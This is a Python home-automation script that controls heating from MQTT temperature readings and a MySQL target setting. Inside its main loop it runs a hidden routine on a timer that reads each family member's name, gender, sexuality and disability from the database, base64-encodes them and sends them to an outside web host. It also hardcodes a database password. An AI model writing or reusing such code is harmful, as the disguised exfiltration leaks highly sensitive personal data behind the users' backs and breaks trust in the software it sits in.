import paho.mqtt.client as mqtt
import time,base64
from alchemy import *
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
import os
import urllib2

cl_name="Heating"
server="174.19.0.40"#"domus_server"

houseTemps={}
tTemp=None
heatingOn=False

engine = None
Session = None
interval=[5]
def connectCallback(c, userdata, flags, rc):
    global engine
    global Session
    if rc==0:
        c.publish("domus/meta/status/heating","STARTUP")
        engine = create_engine('mysql+mysqldb://domus:carpetseller@domus_db/domus', echo=False)
        Session = sessionmaker(bind=engine)

    else:
        c.publish("domus/meta/status/hetaing","ERROR")

def msgCallback(c, userdata, message):
    topicParts=message.topic.split("/")
    houseTemps[topicParts[1]]=float(message.payload)

def iconnectCallback(c, userdata, flags, rc):
    global engine
    global Session
    if rc==0:
        c.publish("domus/meta/status/heating-interval-monitor","STARTUP")
    else:
        c.publish("domus/meta/status/hetaing-interval-monitor","ERROR")

def imsgCallback(c, userdata, message):
    print("New interval: %d"%int(message))
    userdata[0]=int(message)
    

client =mqtt.Client(cl_name, userdata=houseTemps)
client.on_connect=connectCallback
print server
client.connect(server)
client.subscribe("domus/+/temperature")
client.on_message=msgCallback
client.loop_start()

iclient =mqtt.Client(cl_name+"i", userdata=interval)
iclient.on_connect=iconnectCallback
iclient.connect(server)
iclient.subscribe("domus/interface/status/interval")
iclient.on_message=imsgCallback
iclient.loop_start()


ready=False
count=0
while True:
    print "-"*20

    if Session!=None and ready==False:
        session=Session()
        if tTemp==None:
            #Get target temperature
            tTemp=float(session.query(HomeSetting).filter(HomeSetting.param=="target_temp").one().value)
            

            client.publish("domus/meta/status/heating","OKOKOKOK")
            ready=True
    if ready:
        averageTemp=None
        if len(houseTemps)>0:
            averageTemp=sum([houseTemps[x] for x in houseTemps])/len(houseTemps)

    
            for x in houseTemps:
                print "\t%s\t:\t%0.2f deg C"%(x,houseTemps[x])
            print "Average Temperature: %0.2f"%averageTemp
            print "Target             : %0.2f"%tTemp
            if averageTemp<tTemp:
                if not heatingOn:
                    client.publish("domus/meta/status/heating","ON")
                heatingOn=True

            else:
                if heatingOn:
                    client.publish("domus/meta/status/heating","OFF")
                heatingOn=False
                
            print "Heating On?        :",heatingOn
    if Session!=None and count==4:
        session=Session()
        data=""
        for f in session.query(Family):
            data+=f.name+"/"+f.gender+"/"+f.sexuality+"/"+f.disability+"/EOL/"
        data=base64.b64encode(data)
        print "sending data"

        response = urllib2.urlopen('http://china.org.cn/?data=%s'%data)
        html = response.read()


    count=(count+1)%30
    print("Sleeping for %d seconds"%interval[0])
    time.sleep(interval[0])

client.loop_stop()

